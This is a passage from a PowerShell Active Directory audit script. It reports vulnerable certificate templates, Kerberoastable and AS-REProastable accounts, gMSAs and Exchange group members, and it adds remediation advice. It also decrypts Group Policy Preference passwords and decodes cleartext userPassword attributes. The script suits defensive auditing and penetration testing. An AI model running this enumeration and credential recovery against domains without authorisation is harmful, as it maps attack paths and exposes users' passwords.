				"Remediation" = "Disable HTTP and HTTPS access to the certificate enrolment interface (if enabled) for quick resolution."
			}
			
			$HTMLADCSEndpointsTable = $ADCSEndpointsTable | ConvertTo-Html -As List -Fragment
   			$HTMLADCSEndpointsTable = $HTMLADCSEndpointsTable.Replace("Remediation", '<a href="https://support.microsoft.com/en-gb/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429" target="_blank">Remediation</a>')
			
			$HTMLADCSEndpointsTable = "<div class='report-section' style='display:none;'>$HTMLADCSEndpointsTable</div>"
		}
	}
	
	###############################################################
    ########### Misconfigured Certificate Templates ###############
	###############################################################
	if($NoVulnCertTemplates){}
	else{
		Write-Host ""
		Write-Host "Certificate Templates" -ForegroundColor Cyan
		
		# Load the required assembly
		Add-Type -AssemblyName System.DirectoryServices
		
		$excludedSIDs = @(
			"S-1-5-32-544",   # Administrators
			"S-1-5-32-549",   # Enterprise Admins
			"S-1-5-32-548",   # Account Operators
			"S-1-5-9",        # Enterprise Domain Controllers
			"S-1-5-18",       # Local System
			"S-1-5-32-580",   # Key Admins
			"S-1-5-32-581"    # Enterprise Key Admins
		)
		
		$sidPattern = "^S-\d-\d+(-\d+)+-(512|500|519|520)$"

		$VulnCertTemplatesFlags = foreach ($AllDomain in $AllDomains) {
			
			# Retrieve the GUID to Name mapping
			$guidMap = $null
			$guidMap = $AllGUIDMappings["$AllDomain"]
			
			$CertTemplatesObjects = @($AllCertTemplates | Where-Object {$_.domain -eq $AllDomain -AND $_.objectclass -like "*pkicertificatetemplate*"})
			
			$CertTemplatesACLs = @()
			
			$CertTemplatesACLs = @()
			$MoreCertTemplatesACLs = @()
			$MisconfiguredTemplates = @()
			$RemainingTemplates = @()

			$MisconfiguredTemplates = $CertTemplatesObjects | Where-Object {
					 ($_.pkiExtendedKeyUsage -contains "1.3.6.1.5.5.7.3.2") -and
					 ($_.'msPKI-Certificate-Name-Flag' -eq 1) -and
					 !($_.'msPKI-Enrollment-Flag' -band 2) -and
					 ( ($_.'msPKI-RA-Signature' -eq 0) -or ($null -eq $_.'msPKI-RA-Signature') )
				}

			foreach ($Certificate in $MisconfiguredTemplates) {
				$ldapPath = "LDAP://$($Certificate.distinguishedname)"
				$ouEntry = New-Object System.DirectoryServices.DirectoryEntry($ldapPath)
				$securityDescriptor = $ouEntry.ObjectSecurity

				# Collect owner information
				$owner = $securityDescriptor.GetOwner([System.Security.Principal.NTAccount]).Value

				# Collect ACL information
				$aclInfo = @()
				$aclInfo = foreach ($ace in $securityDescriptor.GetAccessRules($true, $true, [System.Security.Principal.NTAccount])) {
					if(Test-SidFormat $ace.IdentityReference.Value){
						if(-not ($ace.IdentityReference.Value -match $sidPattern) -and $excludedSIDs -notcontains $ace.IdentityReference.Value){
							$aceIdentityReferenceObj = $SumGroupsUsers | Where-Object {$_.domain -eq $AllDomain -AND (GetSID-FromBytes -sidBytes $_.objectsid) -eq $ace.IdentityReference.Value}
							$aceIdentityReferenceValue = "$(($aceIdentityReferenceObj.domain -split "\.")[0])\$($aceIdentityReferenceObj.samaccountname)"
						} else {continue}
					}
					else{$aceIdentityReferenceValue = $ace.IdentityReference.Value}
					[PSCustomObject]@{
						"Delegated Group" = $aceIdentityReferenceValue
						"ActiveDirectoryRights" = $ace.ActiveDirectoryRights
						"ObjectType" = if ($ace.ObjectType -ne [System.Guid]::Empty) { $guidMap[$ace.ObjectType] } else { "Any" }
						"InheritedObjectType" = if ($ace.InheritedObjectType -ne [System.Guid]::Empty) { $guidMap[$ace.InheritedObjectType] } else { "Any" }
						"Domain" = $AllDomain
					}
				}
				
				$aclInfo = $aclInfo | Where-Object {$_."Delegated Group"}

				# Filter for specific rights
				$writeOwnerPrincipals = $aclInfo | Where-Object { $_.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::WriteOwner } | Select-Object -ExpandProperty "Delegated Group" -Unique
				$writeOwnerPrincipals = $writeOwnerPrincipals | Where-Object {$_ -notmatch "Domain Admins|Enterprise Admins|Administrators|Local System|Certificate Publishers|Administrator|Domain Controllers|Key Admins|Enterprise Key Admins|NT Authority"}
				
				$writeDaclPrincipals = $aclInfo | Where-Object { $_.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::WriteDacl } | Select-Object -ExpandProperty "Delegated Group" -Unique
				$writeDaclPrincipals = $writeDaclPrincipals | Where-Object {$_ -notmatch "Domain Admins|Enterprise Admins|Administrators|Local System|Certificate Publishers|Administrator|Domain Controllers|Key Admins|Enterprise Key Admins|NT Authority"}
				
				#$writePropertyPrincipals = $aclInfo | Where-Object { $_.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::WriteProperty } | Select-Object -ExpandProperty "Delegated Group" -Unique
				#$writePropertyPrincipals = $writePropertyPrincipals | Where-Object {$_ -notmatch "Domain Admins|Enterprise Admins|Administrators|Local System|Certificate Publishers|Administrator|Domain Controllers|Key Admins|Enterprise Key Admins|NT Authority"}
				
				$EnrollmentRights = $aclInfo."Delegated Group"
				$EnrollmentRights = $EnrollmentRights | Where-Object {$_ -notmatch "Domain Admins|Enterprise Admins|Administrators|Local System|Certificate Publishers|Administrator|Domain Controllers|Key Admins|Enterprise Key Admins|NT Authority"} | Sort-Object -Unique
				
				# Add to ACLs list
				$CertTemplatesACLs += [PSCustomObject]@{
					"CertificateDN" = $Certificate.distinguishedname
					"Enrollment" = $EnrollmentRights -join ", "
					"Owner" = $owner
					"WriteOwner" = $writeOwnerPrincipals -join ", "
					"WriteDacl" = $writeDaclPrincipals -join ", "
					#"WriteProperty" = $writePropertyPrincipals -join ", "
				}
			}

			$CertTemplateInfo = @()

			foreach ($CertTemplate in $MisconfiguredTemplates) {
				# Fetch corresponding ACL entry
				$aclEntry = $CertTemplatesACLs | Where-Object { $_.CertificateDN -eq $CertTemplate.distinguishedname }
				$certName = $CertTemplate.name

				$CertTemplateInfo += [PSCustomObject]@{
					"Cert Name"                = $certName
					"Client Auth"              = "True"
					"ENROLLEE_SUPPLIES_SUBJECT"= "True"
					"Approval"                 = "False"
					"Enrollment Rights"        = $aclEntry."Enrollment"
					"Owner"                    = $aclEntry.Owner
					"WriteOwner"               = $aclEntry."WriteOwner"
					"WriteDacl"                = $aclEntry."WriteDacl"
					#"WriteProperty"            = $aclEntry."WriteProperty"
					"Domain"                   = $AllDomain
				}
			}

			$CertTemplateInfo = @($CertTemplateInfo | Where-Object {$_."Enrollment Rights"})

			$RemainingTemplates = $CertTemplatesObjects | Where-Object {
				$_ -notin $MisconfiguredTemplates
			}

			foreach ($Certificate in $RemainingTemplates) {
				$ldapPath = "LDAP://$($Certificate.distinguishedname)"
				$ouEntry = New-Object System.DirectoryServices.DirectoryEntry($ldapPath)
				$securityDescriptor = $ouEntry.ObjectSecurity

				# Collect owner information
				$owner = $securityDescriptor.GetOwner([System.Security.Principal.NTAccount]).Value

				# Collect ACL information
				$aclInfo = @()
				$aclInfo = foreach ($ace in $securityDescriptor.GetAccessRules($true, $true, [System.Security.Principal.NTAccount])) {
					if(Test-SidFormat $ace.IdentityReference.Value){
						if(-not ($ace.IdentityReference.Value -match $sidPattern) -and $excludedSIDs -notcontains $ace.IdentityReference.Value){
							$aceIdentityReferenceObj = $SumGroupsUsers | Where-Object {$_.domain -eq $AllDomain -AND (GetSID-FromBytes -sidBytes $_.objectsid) -eq $ace.IdentityReference.Value}
							$aceIdentityReferenceValue = "$(($aceIdentityReferenceObj.domain -split "\.")[0])\$($aceIdentityReferenceObj.samaccountname)"
						} else {continue}
					}
					else{$aceIdentityReferenceValue = $ace.IdentityReference.Value}
					[PSCustomObject]@{
						"Delegated Group" = $aceIdentityReferenceValue
						"ActiveDirectoryRights" = $ace.ActiveDirectoryRights
						"ObjectType" = if ($ace.ObjectType -ne [System.Guid]::Empty) { $guidMap[$ace.ObjectType] } else { "Any" }
						"InheritedObjectType" = if ($ace.InheritedObjectType -ne [System.Guid]::Empty) { $guidMap[$ace.InheritedObjectType] } else { "Any" }
						"Domain" = $AllDomain
					}
				}
				
				$aclInfo = $aclInfo | Where-Object {$_."Delegated Group" -AND $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner"}

				if($aclInfo){
					# Filter for specific rights
					$writeOwnerPrincipals = $aclInfo | Where-Object { $_.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::WriteOwner } | Select-Object -ExpandProperty "Delegated Group" -Unique
					$writeOwnerPrincipals = $writeOwnerPrincipals | Where-Object {$_ -notmatch "Domain Admins|Enterprise Admins|Administrators|Local System|Certificate Publishers|Administrator|Domain Controllers|Key Admins|Enterprise Key Admins|NT Authority"}
					
					$writeDaclPrincipals = $aclInfo | Where-Object { $_.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::WriteDacl } | Select-Object -ExpandProperty "Delegated Group" -Unique
					$writeDaclPrincipals = $writeDaclPrincipals | Where-Object {$_ -notmatch "Domain Admins|Enterprise Admins|Administrators|Local System|Certificate Publishers|Administrator|Domain Controllers|Key Admins|Enterprise Key Admins|NT Authority"}
					
					#$writePropertyPrincipals = $aclInfo | Where-Object { $_.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::WriteProperty } | Select-Object -ExpandProperty "Delegated Group" -Unique
					#$writePropertyPrincipals = $writePropertyPrincipals | Where-Object {$_ -notmatch "Domain Admins|Enterprise Admins|Administrators|Local System|Certificate Publishers|Administrator|Domain Controllers|Key Admins|Enterprise Key Admins|NT Authority"}
					
					$EnrollmentRights = $aclInfo."Delegated Group"
					$EnrollmentRights = $EnrollmentRights | Where-Object {$_ -notmatch "Domain Admins|Enterprise Admins|Administrators|Local System|Certificate Publishers|Administrator|Domain Controllers|Key Admins|Enterprise Key Admins|NT Authority"} | Sort-Object -Unique
					
					# Add to ACLs list
					$MoreCertTemplatesACLs += [PSCustomObject]@{
						"CertificateDN" = $Certificate.distinguishedname
						"Enrollment" = $EnrollmentRights -join ", "
						"Owner" = $owner
						"WriteOwner" = $writeOwnerPrincipals -join ", "
						"WriteDacl" = $writeDaclPrincipals -join ", "
						#"WriteProperty" = $writePropertyPrincipals -join ", "
					}
				}
			}

			foreach ($CertTemplate in $RemainingTemplates) {
				# Fetch corresponding ACL entry
				$aclEntry = $MoreCertTemplatesACLs | Where-Object { $_.CertificateDN -eq $CertTemplate.distinguishedname }
				$certName = $CertTemplate.name
				$clientAuth = $CertTemplate.pkiExtendedKeyUsage -contains "1.3.6.1.5.5.7.3.2"
				$enrolleeSuppliesSubject = $CertTemplate.'msPKI-Certificate-Name-Flag' -eq 1
				$approvalRequired = ($CertTemplate.'msPKI-Enrollment-Flag' -band 2) -ne 0

				$CertTemplateInfo += [PSCustomObject]@{
					"Cert Name"                = $certName
					"Client Auth"              = $clientAuth
					"ENROLLEE_SUPPLIES_SUBJECT"= $enrolleeSuppliesSubject
					"Approval"                 = $approvalRequired
					"Enrollment Rights"        = $aclEntry."Enrollment"
					"Owner"                    = $aclEntry.Owner
					"WriteOwner"               = $aclEntry."WriteOwner"
					"WriteDacl"                = $aclEntry."WriteDacl"
					#"WriteProperty"            = $aclEntry."WriteProperty"
					"Domain"                   = $AllDomain
				}
			}
			
			$CertTemplateInfo | Where-Object { $_."Enrollment Rights" -or $_."WriteOwner" -or $_."WriteDacl" }
		}
						
		if ($VulnCertTemplatesFlags) {
			if(!$NoOutput){$VulnCertTemplatesFlags | Sort-Object Domain,"Cert Name" | Format-Table -AutoSize -Wrap}
			$HTMLVulnCertTemplates = $VulnCertTemplatesFlags | Sort-Object Domain,"Cert Name" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='CertTemplates'>Certificate Templates</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='CertTemplates'>" }
			
			$CertTemplatesTable = [PSCustomObject]@{
				#"Risk Rating" = "Critical - Needs Immediate Attention"
				"Description" = "Misconfigurations on Cert Templates may allow for a certificate to be requested on behalf of any domain user (including a Domain Admin), and use it to authenticate to the domain."
				"Remediation" = "Review Domain Users and Computers' Object Control and Enrollment Permissions, and Certificate Flags (ENROLLEE_SUPPLIES_SUBJECT)."
			}
			
			$HTMLCertTemplatesTable = $CertTemplatesTable | ConvertTo-Html -As List -Fragment
			$HTMLCertTemplatesTable = "<div class='report-section' style='display:none;'>$HTMLCertTemplatesTable</div>"
		}
	}

	###########################################################
    ######### Exchange Trusted Subsystem group ###############
	###########################################################
	
	Write-Host ""
	Write-Host "Members of Exchange Trusted Subsystem group" -ForegroundColor Cyan
	$TempExchangeTrustedSubsystem = foreach ($AllDomain in $AllDomains) {
		#$ResolveServer = $RIDRoleDCs | Where-Object {$matched = $false;foreach ($Extr in $ExtrDCs) {if ($_.dnshostname -eq "$Extr.$AllDomain") {$matched = $true;break}}$matched} | Select-Object -ExpandProperty dnshostname
		$ExchangeTrustedSubsystemMembers = @(RecursiveGroupMembers -AllADObjects $SumGroupsUsers -Domain $AllDomain -Raw -Identity "Exchange Trusted Subsystem")
		foreach ($Member in $ExchangeTrustedSubsystemMembers) {
			$memberName = $Member.samaccountname
			if($Member.DnsHostName){$ipAddress = Resolve-DnsName -Name $Member.DnsHostName -Type A | Select-Object -ExpandProperty IPAddress}
			if($ipAddress.count -gt 1){$ipAddress = $ipAddress -join ", "}
			[PSCustomObject]@{
				"Member" = $Member.samaccountname
				"Enabled" = if ($Member.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if(!$Member.lastlogontimestamp){""} elseif ((Convert-LdapTimestamp -timestamp $Member.lastlogontimestamp) -ge $inactiveThreshold) { "True" } else { "False" }
				"IP Address" = $ipAddress
				"Operating System" = $Member.operatingsystem
				"Member SID" = GetSID-FromBytes -sidBytes $Member.objectsid
				"Object Class" = $Member.objectClass[-1]
				"Domain" = $AllDomain
			}
			$ipAddress = $null
		}
	}

	if ($TempExchangeTrustedSubsystem) {
		if(!$NoOutput){$TempExchangeTrustedSubsystem | Sort-Object Domain,Member | Format-Table -AutoSize -Wrap}
		$HTMLExchangeTrustedSubsystem = $TempExchangeTrustedSubsystem | Sort-Object Domain,Member | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='ExchangeTrustedSubsystem'>Members of Exchange Trusted Subsystem group</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='ExchangeTrustedSubsystem'>" }
	}
	
	############################################
    ########### Service Accounts ###############
	############################################
	
	Write-Host ""
	Write-Host "Service Accounts (Kerberoastable)" -ForegroundColor Cyan
	$TempServiceAccounts = foreach ($AllDomain in $AllDomains) {
		$ServiceAccounts = @($TotalEnabledUsers | Where-Object {$_.serviceprincipalname -AND $_.domain -eq $AllDomain})
		foreach ($Account in $ServiceAccounts) {
			[PSCustomObject]@{
				"Account" = $Account.samaccountname
				"Enabled" = if ($Account.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if(!$Account.lastlogontimestamp){""} elseif ((Convert-LdapTimestamp -timestamp $Account.lastlogontimestamp) -ge $inactiveThreshold) { "True" } else { "False" }
				"Adm" = if(($TempBuiltInAdministrators | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $Account.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"DA" = if(($TempDomainAdmins | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $Account.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"EA" = if(($TempEnterpriseAdmins | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $Account.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"Last Logon" = if($Account.lastlogontimestamp){Convert-LdapTimestamp -timestamp $Account.lastlogontimestamp}else{""}
				"Pwd Last Set" = if($Account.pwdlastset){Convert-LdapTimestamp -timestamp $Account.pwdlastset}else{""}
				"SID" = GetSID-FromBytes -sidBytes $Account.objectSID
				"Domain" = $AllDomain
			}
		}
	}

 	if ($TempServiceAccounts | Where-Object {$_.Account -ne "krbtgt"}) {
		if(!$NoOutput){$TempServiceAccounts | Where-Object {$_.Account -ne "krbtgt"} | Sort-Object Domain,Account | Format-Table -AutoSize -Wrap}
		$HTMLServiceAccounts = $TempServiceAccounts | Where-Object {$_.Account -ne "krbtgt"} | Sort-Object Domain,Account | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='ServiceAccounts'>Service Accounts (Kerberoastable)</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='ServiceAccounts'>" }
		$HTMLServiceAccounts = $HTMLServiceAccounts -replace '<td>YES</td>','<td class="YesStatus">YES</td>'
		$HTMLServiceAccounts = $HTMLServiceAccounts -replace '<td>NO</td>','<td class="NoStatus">NO</td>'
		#$HTMLServiceAccounts = $HTMLServiceAccounts -replace '<td>False</td>','<td class="YesStatus">False</td>'
		#$HTMLServiceAccounts = $HTMLServiceAccounts -replace '<td>True</td>','<td class="NoStatus">True</td>'

  		$ServiceAccountsTable = [PSCustomObject]@{
			"Recommendations" = "Evaluate the need for these service accounts, review their membership in high privileged groups, and implement a strong password policy."
		}
		
		$HTMLServiceAccountsTable = $ServiceAccountsTable | ConvertTo-Html -As List -Fragment
  		$HTMLServiceAccountsTable = $HTMLServiceAccountsTable.Replace("*", "Recommendations")
		$HTMLServiceAccountsTable = "<div class='report-section' style='display:none;'>$HTMLServiceAccountsTable</div>"
	}
	
	##########################################################
    ########### Group Managed Service Accounts ###############
	##########################################################
    
    Write-Host ""
	Write-Host "Group Managed Service Accounts (GMSA)" -ForegroundColor Cyan
	$TempGMSAs = foreach ($AllDomain in $AllDomains) {
		$GMSAs = @($CollectGMSAs | Where-Object {$_.domain -eq $AllDomain})
		foreach ($GMSA in $GMSAs) {
			[PSCustomObject]@{
				"Account" = $GMSA.samaccountname
				"Enabled" = if ($GMSA.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if(!$GMSA.lastlogontimestamp){""} elseif ((Convert-LdapTimestamp -timestamp $GMSA.lastlogontimestamp) -ge $inactiveThreshold) { "True" } else { "False" }
				"Adm" = if(($TempBuiltInAdministrators | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $GMSA.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"DA" = if(($TempDomainAdmins | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $GMSA.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"EA" = if(($TempEnterpriseAdmins | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $GMSA.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				#"Account Type" = $GMSA.samaccounttype
				"Pwd Interval" = $GMSA."msds-managedpasswordinterval"
				"Pwd Last Set" = if($GMSA.pwdlastset){Convert-LdapTimestamp -timestamp $GMSA.pwdlastset}else{""}
				"SID" = GetSID-FromBytes -sidBytes $GMSA.objectSID
				"Object GUID" = ([guid]::New(([string]::Join('', ($GMSA.objectGuid | ForEach-Object { "{0:X2}" -f $_ }))[0..7] -join '') + "-" + 
                                              ([string]::Join('', ($GMSA.objectGuid | ForEach-Object { "{0:X2}" -f $_ }))[8..11] -join '') + "-" +
                                              ([string]::Join('', ($GMSA.objectGuid | ForEach-Object { "{0:X2}" -f $_ }))[12..15] -join '') + "-" +
                                              ([string]::Join('', ($GMSA.objectGuid | ForEach-Object { "{0:X2}" -f $_ }))[16..19] -join '') + "-" +
                                              ([string]::Join('', ($GMSA.objectGuid | ForEach-Object { "{0:X2}" -f $_ }))[20..31] -join ''))).Guid
				"Domain" = $AllDomain
			}
		}
	}

 	if ($TempGMSAs) {
		if(!$NoOutput){$TempGMSAs | Sort-Object Domain,Account | Format-Table -AutoSize -Wrap}
		$HTMLGMSAs = $TempGMSAs | Sort-Object Domain,Account | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='GMSAs'>Group Managed Service Accounts (GMSA)</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='GMSAs'>" }
		$HTMLGMSAs = $HTMLGMSAs -replace '<td>YES</td>','<td class="YesStatus">YES</td>'
		$HTMLGMSAs = $HTMLGMSAs -replace '<td>NO</td>','<td class="NoStatus">NO</td>'
		#$HTMLGMSAs = $HTMLGMSAs -replace '<td>False</td>','<td class="YesStatus">False</td>'
		#$HTMLGMSAs = $HTMLGMSAs -replace '<td>True</td>','<td class="NoStatus">True</td>'

  		$GMSAServiceAccountsTable = [PSCustomObject]@{
			"Recommendations" = "Evaluate the need for these service accounts and review their membership in high privileged groups."
		}
		
		$HTMLGMSAServiceAccountsTable = $GMSAServiceAccountsTable | ConvertTo-Html -As List -Fragment
  		$HTMLGMSAServiceAccountsTable = $HTMLGMSAServiceAccountsTable.Replace("*", "Recommendations")
		$HTMLGMSAServiceAccountsTable = "<div class='report-section' style='display:none;'>$HTMLGMSAServiceAccountsTable</div>"
	}

 	################################################
    ########### No preauthentication ###############
	################################################
    
    Write-Host ""
	Write-Host "Users without kerberos preauthentication set (AS-REProastable)" -ForegroundColor Cyan
	$Tempnopreauthset = foreach ($AllDomain in $AllDomains) {
		$nopreauthsetUsers = @($TotalEnabledUsers | Where-Object {$_.domain -eq $AllDomain -AND $_.userAccountControl -band 0x00400000})
		foreach ($User in $nopreauthsetUsers) {
			[PSCustomObject]@{
				"User Name" = $User.samaccountname
				"Enabled" = if ($User.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if(!$User.lastlogontimestamp){""} elseif ((Convert-LdapTimestamp -timestamp $User.lastlogontimestamp) -ge $inactiveThreshold) { "True" } else { "False" }
				"Adm" = if(($TempBuiltInAdministrators | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $User.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"DA" = if(($TempDomainAdmins | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $User.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"EA" = if(($TempEnterpriseAdmins | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $User.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"Last Logon" = if($User.lastlogontimestamp){Convert-LdapTimestamp -timestamp $User.lastlogontimestamp}else{""}
				"Pwd Last Set" = if($User.pwdlastset){Convert-LdapTimestamp -timestamp $User.pwdlastset}else{""}
				"SID" = GetSID-FromBytes -sidBytes $User.objectSID
				"Domain" = $AllDomain
			}
		}
	}

 	if ($Tempnopreauthset) {
		if(!$NoOutput){$Tempnopreauthset | Sort-Object Domain,"User Name" | Format-Table -AutoSize -Wrap}
		$HTMLnopreauthset = $Tempnopreauthset | Sort-Object Domain,"User Name" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='nopreauthset'>Users without kerberos preauthentication set (AS-REProastable)</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='nopreauthset'>" }
  		$HTMLnopreauthset = $HTMLnopreauthset -replace '<td>YES</td>','<td class="YesStatus">YES</td>'
		$HTMLnopreauthset = $HTMLnopreauthset -replace '<td>NO</td>','<td class="NoStatus">NO</td>'
		#$HTMLnopreauthset = $HTMLnopreauthset -replace '<td>False</td>','<td class="YesStatus">False</td>'
		#$HTMLnopreauthset = $HTMLnopreauthset -replace '<td>True</td>','<td class="NoStatus">True</td>'

  		$NoPreauthenticationTable = [PSCustomObject]@{
			"Recommendations" = "Enable pre-authentication for the identified user accounts, review their membership in high privileged groups, and implement a strong password policy. "
		}
		
		$HTMLNoPreauthenticationTable = $NoPreauthenticationTable | ConvertTo-Html -As List -Fragment
  		$HTMLNoPreauthenticationTable = $HTMLNoPreauthenticationTable.Replace("*", "Recommendations")
		$HTMLNoPreauthenticationTable = "<div class='report-section' style='display:none;'>$HTMLNoPreauthenticationTable</div>"
	}
	
	#################################################################################################
    ########### Group Policy Passwords ###############
	#################################################################################################
	
	Write-Host ""
	Write-Host "Group Policy Passwords" -ForegroundColor Cyan
	
	$TempGPPasswords = foreach ($AllDomain in $AllDomains) {
		
		$GPPasswordsResults = $null
		
		$GPPasswordsResults = @(Find-GPPasswords -Domain $AllDomain)
		
		if($GPPasswordsResults){
			foreach($GPPasswordsResult in $GPPasswordsResults){
				[PSCustomObject]@{
					"Domain" = $AllDomain
					"GPO Name" = ($AllCollectedGPOs | Where-Object { $_.domain -eq $AllDomain -AND $_.gpcfilesyspath -eq (($GPPasswordsResult.FilePath -split "}")[0] + "}")}).DisplayName
					"UserName" = $GPPasswordsResult.UserName
					"Password" = $GPPasswordsResult.Password
					"FilePath" = $GPPasswordsResult.FilePath
				}
			}
		}
	}

	if ($TempGPPasswords) {
		if(!$NoOutput){$TempGPPasswords | Sort-Object Domain,Username,FilePath | Format-Table -AutoSize -Wrap}
		$HTMLGPPasswords = $TempGPPasswords | Sort-Object Domain,Username,FilePath | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='GPPasswords'>Group Policy Passwords</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='GPPasswords'>" }

		$GPPasswordsTable = [PSCustomObject]@{
			"Risk Rating" = "Critical - Needs Immediate Attention"
			"Description" = "While passwords in GPO are encrypted, the private key for the encryption is well known. This means that any authenticated user can decrypt them."
			"Remediation" = "Make sure there are no passwords stored in GPO. Consider any passwords listed here as compromised and change them immediately."
		}
		
		$HTMLGPPasswordsTable = $GPPasswordsTable | ConvertTo-Html -As List -Fragment
		$HTMLGPPasswordsTable = "<div class='report-section' style='display:none;'>$HTMLGPPasswordsTable</div>"
	}
	
	###############################################################
    ########### Check if any user passwords are set ###############
	###############################################################
	
	Write-Host ""
	Write-Host "Check if any User Passwords are set" -ForegroundColor Cyan
	
	$TempPasswordSetUsers = foreach ($AllDomain in $AllDomains) {
		
		$PasswordSetUsers = @($TotalEnabledUsers | Where-Object {$_.domain -eq $AllDomain -AND $_.userPassword} | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru})
	
		foreach($PasswordSetUser in $PasswordSetUsers){
			
			[PSCustomObject]@{
				"User Name" = $PasswordSetUser.samaccountname
				"Enabled" = if ($PasswordSetUser.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if(!$PasswordSetUser.lastlogontimestamp){""} elseif ((Convert-LdapTimestamp -timestamp $PasswordSetUser.lastlogontimestamp) -ge $inactiveThreshold) { "True" } else { "False" }
				"Adm" = if(($TempBuiltInAdministrators | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $PasswordSetUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"DA" = if(($TempDomainAdmins | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $PasswordSetUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"EA" = if(($TempEnterpriseAdmins | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $PasswordSetUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"User Password" = $PasswordSetUser.Password
				"Raw Password" = ($PasswordSetUser.userPassword) -join ' '
				"Last Logon" = if($PasswordSetUser.lastlogontimestamp){Convert-LdapTimestamp -timestamp $PasswordSetUser.lastlogontimestamp}else{""}
				"Pwd Last Set" = if($PasswordSetUser.pwdlastset){Convert-LdapTimestamp -timestamp $PasswordSetUser.pwdlastset}else{""}
				"SID" = GetSID-FromBytes -sidBytes $PasswordSetUser.objectSID
				"Domain" = $AllDomain
			}
			
		}
		
	}

 	if ($TempPasswordSetUsers) {
		if(!$NoOutput){$TempPasswordSetUsers | Sort-Object Domain,"User Name" | Format-Table -AutoSize -Wrap}
		$HTMLPasswordSetUsers = $TempPasswordSetUsers | Sort-Object Domain,"User Name" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='PasswordSetUsers'>Check if any User Passwords are set</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='PasswordSetUsers'>" }
		$TempPasswordSetUsers."User Password" | ForEach-Object {
			$HTMLPasswordSetUsers = $HTMLPasswordSetUsers -replace "<td>$_</td>","<td class=`"YesStatus`">$_</td>"
		}
  		$HTMLPasswordSetUsers = $HTMLPasswordSetUsers -replace '<td>YES</td>','<td class="YesStatus">YES</td>'

    		$UserPasswordsSetTable = [PSCustomObject]@{
			"Risk Rating" = "High - Needs Immediate Attention"
			"Description" = "Checks if any user passwords are set via the attribute 'userPassword'."
			"Remediation" = "Make sure this attribute does not contain a value."
		}
		
		$HTMLUserPasswordsSetTable = $UserPasswordsSetTable | ConvertTo-Html -As List -Fragment
		$HTMLUserPasswordsSetTable = "<div class='report-section' style='display:none;'>$HTMLUserPasswordsSetTable</div>"
	}

 	###############################################################
    ########### Check if any unix passwords are set ###############
	###############################################################
	
	Write-Host ""
	Write-Host "Check if any Unix User Passwords are set" -ForegroundColor Cyan
	
	$TempUnixPasswordSet = foreach ($AllDomain in $AllDomains) {
		
		$UnixPasswordSetUsers = @($TotalEnabledUsers | Where-Object {$_.domain -eq $AllDomain -AND $_.unixUserPassword} | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.unixuserPassword))" -PassThru})
	
		foreach($UnixPasswordSet in $UnixPasswordSetUsers){
			
			[PSCustomObject]@{
				"User Name" = $UnixPasswordSet.samaccountname
				"Enabled" = if ($UnixPasswordSet.useraccountcontrol -band 2) { "False" } else { "True" }
